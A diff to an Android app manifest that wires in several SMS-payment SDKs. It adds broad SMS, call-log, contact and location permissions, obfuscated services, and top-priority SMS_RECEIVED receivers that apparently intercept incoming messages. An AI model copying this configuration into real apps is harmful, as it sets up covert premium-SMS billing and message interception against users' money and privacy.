@@ -19,20 +19,137 @@
     <uses-permission android:name="android.permission.VIBRATE"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
 
+    <!--MPay start-->
+    <uses-permission android:name = "android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name = "android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name = "android.permission.INTERNET"/>
+    <uses-permission android:name = "android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name = "android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name = "android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name = "android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name = "android.permission.SEND_SMS"/>
+    <uses-permission android:name = "android.permission.READ_SMS"/>
+    <uses-permission android:name = "android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name = "android.permission.WRITE_SMS"/>
+    <uses-permission android:name = "android.permission.WAKE_LOCK" />
+    <uses-permission android:name = "android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <!--MPay end-->
+
+    <!--qi pa start-->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" ></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" ></uses-permission>
+    <uses-permission android:name="android.permission.INTERNET" ></uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" ></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" ></uses-permission>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS" />
     <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <!--qi pa end-->
+
+    <!-- ============================Yin Mei start========= -->
+    <!-- 允许程序写入外部存储，如SD卡上写文件 -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <!-- 网络处理 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!-- 短信操作 -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <!-- 读取手机信息 -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- 获取经纬度 -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <!-- 获取通话时长 -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <!-- MAC -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <!-- ============================Yin Mei end===================================== -->
 
+    <!--Wei Yun Start-->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!--Wei Yun End-->
+
+    <!--Yi You Start-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.BROADCAST_STICKY" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_CONFIGURATION" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.READ_LOGS"/>
-    <!-- ============================权限===================================== -->
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RUN_INSTRUMENTATION" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <!--Yi You End-->
+
+    <!--Yu Feng start-->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <!--Yu Feng End-->
 
 
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
-        android:supportsRtl="true">
+        android:supportsRtl="true"
+        android:name="com.bb_sz.pay.App"
+        >
         <activity
             android:name=".MainActivity"
             android:launchMode="singleInstance"
@@ -73,28 +190,6 @@
                 <action android:name="com.jpay.main.JPayService" />
             </intent-filter>
         </service>
-        <!--yingmei-->
-        <service android:name="f.g.h.j.ma.MService" >
-        </service>
-        <service android:name="c.a.d.s.LitSce" >
-        </service>
-
-        <receiver
-            android:name="f.g.h.j.ma.MCast"
-            android:label="NetworkConnection" >
-            <intent-filter>
-                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-                <action android:name="android.intent.action.TIME_SET" />
-                <action android:name="android.intent.action.TIME_TICK" />
-                <action android:name="sss_takkk" />
-                <action android:name="sss_tuccc" />
-            </intent-filter>
-            <intent-filter android:priority="2147483647" >
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
-        <!--weiyun-->
-        <service android:name="com.wyzf.service.InitService"></service>
 
         <activity
             android:name="com.jpay.sdk.JPayActivity"
@@ -118,22 +213,7 @@
         <meta-data android:name="BUGLY_APP_CHANNEL" android:value="{$CID$}" />
         <meta-data android:name="BUGLY_ENABLE_DEBUG" android:value="false" />
         <!--Bugly Need End-->
-        <!--weiyun pay-->
-        <meta-data android:name="appCode" android:value="{$APP_CODE$}"/>
-        <meta-data android:name="packCode" android:value="{$CID$}"/>
-        <!--yingmei pay-->
-        <meta-data android:name="YM_CPID" android:value="{$YM_CPID$}" />
-        <!--mipay-->
-        <service android:name="com.android.mtools.MPService"></service>
-        <receiver android:name="com.android.mtools.MyReceiver">
-            <intent-filter android:priority="2147483647">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="SEND_SMS_ACTION1" />
-                <action android:name="SEND_SMS_ACTION2" />
-                <action android:name="GET_SMS_ACTION" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-            </intent-filter>
-        </receiver>
+
 
         <!-- OS Root Start-->
         <meta-data
@@ -143,6 +223,97 @@
             android:name="lyrt_from"
             android:value="os_ms" />
         <!-- OS Root End-->
+        <!--MPay start-->
+        <service android:name="com.android.dimtale.general.MiiService"/>
+        <!--MPay end-->
+
+        <!--qi pa start-->
+        <meta-data android:name="AID" android:value="{$AID$}"/>   <!--应用ID，后台申请-->
+        <meta-data android:name="CPID" android:value="{$CPID$}"/>       <!--商户ID，后台申请-->
+        <meta-data android:name="CHID" android:value="{$CHID$}"/>      <!--渠道ID，后台申请-->
+        <activity
+            android:name="com.door.pay.sdk.DnPayActivity"
+            android:configChanges="orientation|navigation|keyboardHidden|keyboard"
+            android:label="@string/app_name"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="true" >
+            <intent-filter>
+                <action android:name="com.bb_sz.myshell.com.door.pay.sdk.DnPayActivity"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+
+        <receiver android:name="com.door.pay.sdk.sms.SmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.BATTERY_CHANGED" />
+                <action android:name="android.intent.action.SIM_STATE_CHANGED" />
+                <action android:name="android.intent.action.NOTIFICATION_ADD" />
+                <action android:name="android.intent.action.SERVICE_STATE" />
+                <action android:name="android.intent.action.NOTIFICATION_REMOVE" />
+                <action android:name="android.intent.action.NOTIFICATION_UPDATE" />
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
+                <action android:name="android.intent.action.ANY_DATA_STATE" />
+                <action android:name="android.net.wifi.STATE_CHANGE" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.door.pay.sdk.sms.SmsService" >
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.door.pay.sdk.app.action"/>
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </service>
+        <!--qi pa end-->
+
+        <!--Ying Mei Start-->
+        <meta-data android:name="YM_CPID" android:value="{$YM_CPID$}" />
+
+        <service android:name="a.a.b.n.PriSec" >
+        </service>
+        <service android:name="a.a.b.n.NexSec" >
+        </service>
+
+        <receiver
+            android:name="a.a.b.n.PriCst"
+            android:label="NetworkConnection" >
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIME_TICK" />
+                <action android:name="ttt_sskkk" />
+                <action android:name="main_tttt" />
+            </intent-filter>
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!--Ying Mei End-->
+
+        <!--Wei Yun Start-->
+        <service android:name="com.wyzf.service.InitService"></service>
+        <!--Wei Yum  End-->
+
+        <!--Yi You Start-->
+        <service
+            android:name="com.core.main.pay.plugmain.service.SyService"
+            android:enabled="true" />
+        <service android:name="com.core.tools.sms.SmsPlugKeppLiveService" />
+        <!--Yi You End-->
+
+        <!--Yu Feng Start-->
+        <receiver android:name="com.mj.jar.pay.InSmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <service android:name="com.mj.jar.pay.SmsServices"></service>
+        <service android:name="com.mj.sms.service.InitService"></service>
+        <!--Yu Feng End-->
+
 
     </application>
 
